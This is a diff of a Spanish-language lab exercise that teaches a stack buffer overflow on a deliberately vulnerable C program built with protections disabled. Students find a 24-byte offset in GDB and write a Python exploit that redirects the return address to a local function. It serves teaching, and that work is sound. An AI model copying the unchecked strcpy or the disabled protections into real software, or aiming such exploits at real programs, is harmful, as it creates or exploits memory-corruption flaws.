@@ -1,11 +1,26 @@
 # Ejercicio 04: Buffer Overflow - Crear Exploit Funcional
 
-## Objetivos de Aprendizaje
+## Lectura Previa Obligatoria
+
+Antes de comenzar este ejercicio, asegúrate de haber leído:
+- **Lección 06: Buffer Overflow** (`01-teoria/leccion_06.md`)
+
+En esa lección aprendiste:
+- Qué es un buffer overflow en memoria
+- Qué es el return address y dónde está en el stack
+- Qué es little endian y cómo afecta el payload
+- Qué protecciones existen y por qué las desactivamos aquí
+
+Este ejercicio es la práctica directa de esa teoría.
+
+---
+
+## Objetivos
 
 - Explotar un buffer overflow real
-- Controlcar el RIP (instruction pointer)
-- Llamar a funciones arbitrarias
-- Entender qué hace posible un exploit
+- Sobrescribir el return address con una dirección controlada
+- Llamar a una función arbitraria
+- Verificar el exploit con GDB
 
 ## Tiempo Estimado
 
@@ -17,34 +32,29 @@
 
 ---
 
-## Parte 1: Crear Objetivo Vulnerable
-
-### Programa Target
+## Parte 1: Crear el Programa Vulnerable
 
 ```bash
+cd ~/SnowCrash/02-practicas/nivel_01
+
 cat > objetivo.c << 'EOF'
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 
-// Función que NO queremos que se ejecute normalmente
+// Esta función NO se llama normalmente - es nuestro objetivo
 void funcion_privilegiada() {
     printf("¡¡¡ HAS GANADO !!!\n");
     printf("Función privilegiada ejecutada\n");
     exit(0);
 }
 
-// Función vulnerable
 void procesar_entrada(char *entrada) {
     char buffer[16];
-    printf("[*] Procesando entrada...\n");
-    printf("[*] Dirección de buffer: %p\n", (void *)&buffer);
+    printf("[*] Dirección de buffer:              %p\n", (void *)&buffer);
     printf("[*] Dirección de funcion_privilegiada: %p\n", (void *)funcion_privilegiada);
-    
-    strcpy(buffer, entrada);  // VULNERABLE
-    
-    printf("[*] Buffer contiene: %s\n", buffer);
-    printf("[*] Entrada fue: %s\n", entrada);
+
+    strcpy(buffer, entrada);  // VULNERABLE: sin verificar tamaño
 }
 
 int main(int argc, char **argv) {
@@ -52,10 +62,8 @@ int main(int argc, char **argv) {
         printf("Uso: %s <entrada>\n", argv[0]);
         return 1;
     }
-    
     procesar_entrada(argv[1]);
     printf("Función retornó normalmente\n");
-    
     return 0;
 }
 EOF
@@ -71,217 +79,128 @@ gcc -g -O0 \
     -o objetivo objetivo.c
 ```
 
-**Flags explicados:**
-- `-g`: Debug symbols (para GDB)
-- `-O0`: Sin optimizar
-- `-fno-stack-protector`: Desactivar canaries
-- `-z execstack`: Stack ejecutable (para shellcode)
-- `-no-pie`: Sin ASLR (direcciones fijas)
-
-### Verificar protecciones
-
-```bash
-checksec ./objetivo
-
-# Esperado:
-# Full RELRO: No
-# Partial RELRO: No
-# Stack Canary: Disabled
-# NX: Disabled
-# PIE: No
-# RPATH: No
-# RUNPATH: No
-# Symbols: Yes
-```
+Recuerda de Lección 06 por qué cada flag:
+- `-fno-stack-protector` → sin canario
+- `-no-pie` → direcciones fijas (sin ASLR)
+- `-z execstack` → stack ejecutable
 
 ---
 
-## Parte 2: Reconocimiento
-
-### Ejecutar programa normal
+## Parte 2: Observar el Comportamiento Normal
 
 ```bash
 ./objetivo "hola"
-
-# Output:
-# [*] Procesando entrada...
-# [*] Dirección de buffer: 0x7ffffffde4c0
-# [*] Dirección de funcion_privilegiada: 0x400556
-# Función retornó normalmente
 ```
 
-**Información crítica:**
-- Buffer está en `0x7ffffffde4c0`
-- `funcion_privilegiada` está en `0x400556`
+Output esperado:
+```
+[*] Dirección de buffer:               0x7ffffffde4c0
+[*] Dirección de funcion_privilegiada: 0x400556
+Función retornó normalmente
+```
 
-### Probar con input largo
+**Anota las dos direcciones que aparecen. Las necesitarás.**
+
+Ahora prueba con un input largo:
 
 ```bash
-./objetivo "AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-
-# Posible output:
-# Segmentation fault (core dumped)
-# O el programa se comporta extraño
+./objetivo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 ```
 
-El programa crashed porque RIP se corrompió.
+El programa crashea. El return address fue sobrescrito con A's (`0x4141414141414141`) y el CPU no puede saltar ahí.
 
 ---
 
-## Parte 3: Encontrar el Offset
+## Parte 3: Encontrar el Offset al Return Address
 
-Necesitamos saber exactamente **cuántos bytes** escribir para llegar a RIP.
+Necesitas saber cuántos bytes escribir para llegar exactamente al return address.
 
-### Crear patrón único
-
-```bash
-# Patrón de longitud creciente
-python3 << 'EOF'
-# Crear patrón para identificar offset
-pattern = ""
-for i in range(0, 10):
-    pattern += chr(65 + i) * 10  # AAAAAAAAAA BBBBBBBBBB CCCC...
-
-print(pattern)
-EOF
-
-# Output: AAAAAAAAAABBBBBBBBBBCCCCCCCCCC...
-```
-
-Mejor: usar **pwntools** (si tienes):
+### Método: Patrón con letras distintas
 
 ```bash
-pip3 install pwntools
-python3 << 'EOF'
-from pwn import cyclic
-pattern = cyclic(50)
-print(pattern)  # Patrón que nos ayuda a encontrar offset
-EOF
+./objetivo "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
 ```
 
-O generar manualmente:
-
-```bash
-python3 << 'EOF'
-# Crear patrón sencillo
-entrada = "A" * 10
-entrada += "B" * 10
-entrada += "C" * 10
-entrada += "D" * 10
-entrada += "E" * 10
-print(entrada)
-EOF
-```
-
-### Usar GDB para encontrar offset
+Luego en GDB:
 
 ```bash
 gdb ./objetivo
-
-(gdb) run "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"
-# Crashea con RIP corrupto
-
+(gdb) run "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
 (gdb) backtrace
-#0  0x4444444444444444 in ?? ()
-# Encontró 0x44444444 = "DDDD"
-# Eso significa los "D"s corresponden a RIP
-
-# Contar: AAAA(4) BBBB(4) CCCC(4) DDDD(4) = 16 primeros
-# Buffer es 16 bytes, así que offset a RIP = 16 + 8 (saved rbp) = 24
+#0  0x4747474747474747 in ?? ()
 ```
 
-### Método más preciso
+El valor `0x47` es `G` en ASCII. Eso significa que las `G`s sobrescribieron el return address.
+
+Cuenta los bytes antes de las G's:
+```
+AAAA BBBB CCCC DDDD EEEE FFFF = 24 bytes
+```
+
+**Offset = 24 bytes** (16 del buffer + 8 del saved rbp).
+
+### Verificar el offset con GDB
 
 ```bash
-python3 << 'EOF'
-# Crear entrada con offset claro
-buffer_size = 16
-saved_rbp = 8
-offset_to_rip = buffer_size + saved_rbp
+gdb ./objetivo
+(gdb) break procesar_entrada
+(gdb) run "AAAAAAAAAAAAAAAAAAAAAAAA"   # exactamente 24 A's
 
-# Llenar con patrón
-entrada = b"A" * offset_to_rip
-entrada += b"RRRRRRRR"  # RIP debe ser estos 8 bytes
-
-print(entrada.hex())  # Ver qué enviar
-EOF
+(gdb) x/30x $rsp
+# Verás 24 A's (0x41) y luego el return address original
 ```
 
 ---
 
 ## Parte 4: Construir el Exploit
 
-### Paso 1: Generar payload básico
+Con el offset sabido (24), construye el payload:
 
-```bash
-python3 << 'EOF'
-from struct import pack
-
-# Información del programa
-funcion_privilegiada_addr = 0x400556
-buffer_size = 16
-saved_rbp = 8
-offset = buffer_size + saved_rbp
-
-# Construir payload
-payload = b"A" * offset  # Llenar buffer y saved rbp
-payload += pack("<Q", funcion_privilegiada_addr)  # RIP
-
-# Mostrar payload
-print("Payload (hex):", payload.hex())
-print("Payload (len):", len(payload))
-
-# Guardar a archivo
-with open("payload.bin", "wb") as f:
-    f.write(payload)
-EOF
+```
+payload = [24 bytes relleno] + [dirección de funcion_privilegiada]
 ```
 
-### Paso 2: Ejecutar exploit
+La dirección la viste en Parte 2. Usa la que imprimió **tu** programa (puede diferir).
+
+Crea el script:
 
 ```bash
-# Método 1: Pasar como argumento
-python3 -c "
-from struct import pack
-payload = b'A' * 24 + pack('<Q', 0x400556)
-import sys
-sys.stdout.buffer.write(payload)
-" | xargs -0 ./objetivo
-
-# Método 2: Script Python (más limpio)
-cat > exploit.py << 'EXPLOIT'
+cat > exploit.py << 'EOF'
 #!/usr/bin/env python3
 from struct import pack
 import subprocess
 
+# Cambia esta dirección por la que imprimió TU programa
 funcion_privilegiada = 0x400556
-offset = 24
 
+offset = 24  # 16 buffer + 8 saved rbp
+
+# Construir payload
 payload = b"A" * offset
-payload += pack("<Q", funcion_privilegiada)
+payload += pack("<Q", funcion_privilegiada)  # little endian, 8 bytes
 
-print("[*] Payload:", payload)
+print("[*] Payload (hex):", payload.hex())
 print("[*] Longitud:", len(payload))
 
-# Ejecutar
-resultado = subprocess.run(["./objetivo", payload], capture_output=True)
+# Ejecutar exploit
+resultado = subprocess.run(
+    ["./objetivo", payload],
+    capture_output=True
+)
 print("[*] Output:")
-print(resultado.stdout.decode())
-if resultado.stderr:
-    print("[!] Stderr:")
-    print(resultado.stderr.decode())
-
-EXPLOIT
+print(resultado.stdout.decode(errors="replace"))
+EOF
 
 chmod +x exploit.py
 python3 exploit.py
 ```
 
-### Output esperado
+### Output esperado si el exploit funciona
 
 ```
-[*] Procesando entrada...
-[*] Dirección de buffer: 0x7ffffffde4c0
+[*] Payload (hex): 414141...0056400000000000
+[*] Longitud: 32
+[*] Dirección de buffer:               0x7ffffffde4c0
 [*] Dirección de funcion_privilegiada: 0x400556
 ¡¡¡ HAS GANADO !!!
 Función privilegiada ejecutada
@@ -291,128 +210,28 @@ Función privilegiada ejecutada
 
 ## Parte 5: Verificar con GDB
 
-### Confirmar que RIP fue controlado
+Para ver exactamente lo que pasó:
 
 ```bash
 gdb ./objetivo
-
 (gdb) break procesar_entrada
 (gdb) run $(python3 -c "
 from struct import pack
-print('A'*24 + pack('<Q', 0x400556).decode('latin1'))")
+import sys
+payload = b'A'*24 + pack('<Q', 0x400556)
+sys.stdout.buffer.write(payload)
+")
 
-(gdb) continue
-# Debería ejecutar funcion_privilegiada sin crash
-```
+# Avanzar hasta después de strcpy
+(gdb) next
+(gdb) next
 
-### Inspeccionar stack antes del retorno
+# Ver el stack - deberías ver A's seguidas de la dirección
+(gdb) x/30x $rsp
 
-```bash
-(gdb) break procesar_entrada
-(gdb) run $(python3 exploit.py 2>/dev/null | grep "Payload" | cut -d: -f2)
-
-# En el breakpoint:
-(gdb) x/50x &buffer
-# Verás los "A"s seguidos de 0x400556
-
-(gdb) print &buffer
-$1 = 0x7ffffffde4c0
-
-(gdb) x/30x 0x7ffffffde4c0
-# Deberías ver:
-# 0x7ffffffde4c0: 0x41 0x41 ... (AAAA...)
-# 0x7ffffffde4d8: 0x56 0x05 0x40 0x00 ... (dirección de función)
-```
-
----
-
-## Parte 6: Entender Qué Sucedió
-
-### El Ataque Paso a Paso
-
-```
-1. Llamar función normal:
-   ./objetivo "hola"
-   
-2. Objetivo llama procesar_entrada("hola")
-   Stack:
-   [...] [saved_rbp] [saved_rip=main+XX] [buffer de 16 bytes]
-   
-3. strcpy copia "hola" a buffer
-   No pasa nada, "hola" cabe en 16 bytes
-   
-4. procesar_entrada retorna
-   pop rbp -> restaura old rbp
-   ret -> usa saved_rip para saltar a main
-   Funciona normal
-   
-=== AHORA CON EXPLOIT ===
-
-1. Llamar función con payload:
-   ./objetivo "AAAA...A[addr_funcion]"
-   
-2. strcpy copia TODO el payload
-   AAAAAAA... sobrescribe buffer
-   [addr_funcion] sobrescribe saved_rip
-   
-3. procesar_entrada retorna
-   pop rbp -> restaura old rbp (corrupto pero OK)
-   ret -> usa [saved_rip] = 0x400556
-   SALTA A funcion_privilegiada
-   
-4. funcion_privilegiada ejecuta
-   printf("¡¡¡ HAS GANADO !!!\n")
-   exit(0)
-```
-
-### Por Qué Funciona
-
-```
-✓ Sin protecciones de stack (--fno-stack-protector)
-✓ RIP está en sitio predecible (offset fijo)
-✓ Dirección de función es conocida (-no-pie)
-✓ Podemos escribir la dirección exacta
-✓ CPU ejecuta lo que RIP le dice
-```
-
----
-
-## Parte 7: Variaciones del Exploit
-
-### Variación 1: Cambiar función ejecutada
-
-```python
-# En lugar de funcion_privilegiada, llamar a otra
-# Ejemplo: Cambiar para llamar a printf
-
-# Necesita argumentos, más complejo (ver siguiente ejercicio)
-```
-
-### Variación 2: Byteorder (Little Endian vs Big Endian)
-
-```python
-# x86-64 es Little Endian
-# 0x400556 se almacena como: 56 05 40 00 ...
-
-from struct import pack
-addr = 0x400556
-le = pack("<Q", addr)  # Little endian (correcto para x86-64)
-be = pack(">Q", addr)  # Big endian (incorrecto aquí)
-
-print("LE:", le.hex())  # 5605400000000000
-print("BE:", be.hex())  # 0000000000400556
-```
-
-### Variación 3: Payload con NOP sled
-
-```python
-# Técnica para aumentar probabilidad de golpear objetivo
-# (Importante cuando hay ASLR, NO necesario aquí)
-
-NOP = b"\x90"
-payload = NOP * 100  # Llenar con NOPs
-payload += b"A" * (offset - 100)
-payload += pack("<Q", funcion_privilegiada)
+# Ver qué hay en el return address
+(gdb) x/1gx $rbp+8
+# Debería mostrar: 0x0000000000400556
 ```
 
 ---
@@ -422,100 +241,59 @@ payload += pack("<Q", funcion_privilegiada)
 ✅ Completaste cuando:
 
 - [ ] Compilaste objetivo.c sin protecciones
-- [ ] Ejecutaste programa normal (sin crash)
-- [ ] Ejecutaste programa con input largo (crash)
-- [ ] Encontraste offset a RIP (24 bytes)
-- [ ] Creaste exploit.py que carga dirección correcta
-- [ ] Ejecutaste exploit y viste "¡¡¡ HAS GANADO !!!"
-- [ ] Verificaste en GDB que RIP fue sobrescrito
-- [ ] Entendiste cada paso del ataque
+- [ ] Viste las direcciones impresas por el programa
+- [ ] Provocaste el crash con input largo
+- [ ] Encontraste el offset (24 bytes) con el patrón de letras
+- [ ] Creaste exploit.py con la dirección correcta
+- [ ] Viste "¡¡¡ HAS GANADO !!!" en la salida
+- [ ] Verificaste en GDB que el return address fue sobrescrito
 
 ---
 
 ## Desafío Extra
 
-### Nivel 1: Exploit Automático
+### Nivel 1: Encontrar el offset automáticamente
 
-```bash
-# Crear script que automáticamente encuentre offset
-python3 << 'EOF'
+En lugar de contar manualmente, escribe un script que pruebe offsets crecientes:
+
+```python
 import subprocess
-import struct
 
-# Binary search para encontrar offset
-for offset in range(16, 32):
-    payload = b"A" * offset + b"DEADBEEF"
-    try:
-        result = subprocess.run(["./objetivo", payload], 
-                              timeout=1, 
-                              capture_output=True)
-        if b"Segmentation" in result.stderr or "DEAD" in str(result.returncode):
-            print(f"Offset encontrado alrededor de: {offset}")
-            break
-    except:
-        pass
-EOF
+for offset in range(16, 33):
+    payload = b"A" * offset + b"BBBBBBBB"
+    resultado = subprocess.run(["./objetivo", payload], capture_output=True)
+    if b"HAS GANADO" not in resultado.stdout:
+        stderr = resultado.stderr.decode(errors="replace")
+        if "Segmentation" in stderr or resultado.returncode != 0:
+            print(f"Offset candidato: {offset}")
 ```
 
-### Nivel 2: Ejecutar Shellcode
+### Nivel 2: Cambiar la dirección objetivo
 
-(Avanzado - requiere conocimiento de assembly)
+Modifica exploit.py para llamar a `main()` en lugar de `funcion_privilegiada`.
+Usa GDB para obtener la dirección de `main`:
 
 ```bash
-# Generar shellcode que ejecute /bin/sh
-# (Tema para ejercicio 05)
+gdb ./objetivo
+(gdb) print main
+$1 = {int (int, char **)} 0x400580 <main>
 ```
 
-### Nivel 3: Exploit con ASLR Activado
-
-(Muy avanzado)
+### Nivel 3: Observar la diferencia con protecciones activadas
 
 ```bash
-# Compilar con PIE (ASLR)
-gcc -pie -fPIC -o objetivo_aslr objetivo.c
-
-# Ahora necesitarás:
-# - Information leak (format strings)
-# - O ROP gadgets
-# - O Guess direcciones (probabilístico)
+gcc -g -O0 -o objetivo_seguro objetivo.c  # Con canario activado
+./objetivo_seguro "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+# ¿Qué mensaje diferente aparece?
 ```
-
----
-
-## Conceptos Clave Aprendidos
-
-### Explotación de Buffer Overflow
-- Overflow para controlar RIP
-- Estructura del stack
-- Offset a RIP es determinístico
-- Código ejecutable sin límites
-
-### Preparación del Binario
-- Compilar sin protecciones (para laboratorio)
-- Direcciones fijas (-no-pie)
-- Stack ejecutable (-z execstack)
-
-### Construcción de Payload
-- Llenar buffer
-- Llenar saved rbp
-- Sobrescribir RIP con dirección objetivo
-
----
-
-## Conceptos Relacionados (Próximos)
-
-- **ROP Chains**: Cuando código no es ejecutable
-- **Format Strings**: Para leaks de información
-- **ASLR Bypass**: Cuando direcciones cambian
 
 ---
 
 ## Lecturas Relacionadas
 
-- `recursos/gdb-guia.md` - Debugging de exploits
-- `recursos/hints-futuros.md` - ROP chains
-- `01-teoria/leccion_01.md` - Buffer overflow basics
+- `01-teoria/leccion_06.md` - Teoría completa del buffer overflow
+- `recursos/gdb-guia.md` - Sección "Debugging de Vulnerabilidades"
 
 ## Siguiente
 
-**Ejercicio 05:** Format String Vulnerabilities
+**Leer Lección 07** (Format Strings) antes de continuar con Ejercicio 05.
